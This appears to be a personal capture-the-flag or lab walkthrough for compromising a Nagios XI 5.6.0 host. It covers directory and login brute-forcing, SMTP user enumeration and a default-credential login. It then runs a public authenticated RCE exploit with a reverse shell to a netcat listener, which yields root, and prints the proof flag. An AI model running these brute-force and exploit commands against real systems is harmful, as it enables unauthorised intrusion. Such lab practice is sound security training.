# HTTP/80

Nagios XI:
Default creds do not work:
nagiosadmin:nagiosxi

Exploits available
```bash
searchsploit nagios XI
# a lot of exploits..
# 46221: missing python2 dep
# 48640, 47299: require creds
```

Weird Login response if the nsp POST parameter is missing/incorrect:
Request:
```HTTP
POST /nagiosxi/login.php HTTP/1.1
Host: 192.168.131.136
...

page=auth&debug=&pageopt=login&rusername=coconut&password=coconut&loginButton=
```
Response:
```HTTP
HTTP/1.1 403 Forbidden
...

NSP: Sorry Dave, I can't let you do that
```
=> Username dave? Nope, turns out this is a default error message of nagios

Directory brute:
```bash
gobuster dir -u http://192.168.131.136/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -f
```
Results:
```
/cgi-bin/             (Status: 403) [Size: 280]
/javascript/          (Status: 403) [Size: 280]
/icons/               (Status: 403) [Size: 280]
/server-status/       (Status: 403) [Size: 280]
/nagios/              (Status: 401) [Size: 462]
```

Login brute:
```bash
ffuf -request nagios_login.req -request-proto https -w /usr/share/wordlists/rockyou.txt -fr 'Invalid username or password'
```


---
# SMTP:25

Enumerated usernames:
```bash
smtp-user-enum -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.131.136
```
Results:
```

######## Scan started at Sun Oct 19 22:05:42 2025 #########
192.168.131.136: mail exists
192.168.131.136: root exists
192.168.131.136: news exists
192.168.131.136: man exists
192.168.131.136: bin exists
192.168.131.136: games exists
192.168.131.136: nobody exists
192.168.131.136: backup exists
192.168.131.136: coconut exists
192.168.131.136: daemon exists
192.168.131.136: proxy exists
192.168.131.136: list exists
192.168.131.136: Man exists
192.168.131.136: Daemon exists
192.168.131.136: postmaster exists
192.168.131.136: sys exists
192.168.131.136: Proxy exists
192.168.131.136: Marc%20Ludlum 454 4.7.1 <Marc%20Ludlum>: Relay access denied..
192.168.131.136: Nobody exists
192.168.131.136: checkit! 454 4.7.1 <checkit!>: Relay access denied..
192.168.131.136: MAIL exists
192.168.131.136: Klassen! 454 4.7.1 <Klassen!>: Relay access denied..
192.168.131.136: ckck!! 454 4.7.1 <ckck!!>: Relay access denied..
192.168.131.136: Games exists
192.168.131.136: sync exists
192.168.131.136: Root exists
192.168.131.136: Mail exists
192.168.131.136: MAN exists
Aborted
```
Took ages so I aborted the scan, probably not the entry anyway.

---
Anyway took a peek at the walkthrough :)

For the nagios login the default username `nagiosadmin` was kept but the default password was changed from `nagiosxi` to `admin` :)

From here logged-in in the  web ui:

```
Nagios XI 5.6.0
```

For the nagios 5.6.x the following exploits are available:
```bash
#  XI 5.6.1 - SQL injection                                                                                                                                                                           | php/webapps/46910.txt
# Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution                                                                                                                                                 | php/webapps/48640.txt
# Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                                                                                                                                       | php/webapps/47299.php
# Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                                                                                                                                               | multiple/webapps/52138.txt
```
=> 52138 looks promising (CVE-2019–15949)

Exploit:
```bash
python3 52138.py -t https://192.168.131.136/ -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.249 -lp 4444 -k
```
Reverse shell:
```bash
nc -vlnp 4444           
# listening on [any] 4444 ...
# connect to [192.168.45.249] from (UNKNOWN) [192.168.131.136] 49378
# bash: cannot set terminal process group (949): Inappropriate ioctl for device
# bash: no job control in this shell
# root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# whoami
# whoami
# root
# root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# id
# id
# uid=0(root) gid=0(root) groups=0(root)
```
=> we are already root :)

Flag:
```bash
cat /root/proof.txt                  
3d0daf8904c38f6b2852128ea5aa252e
```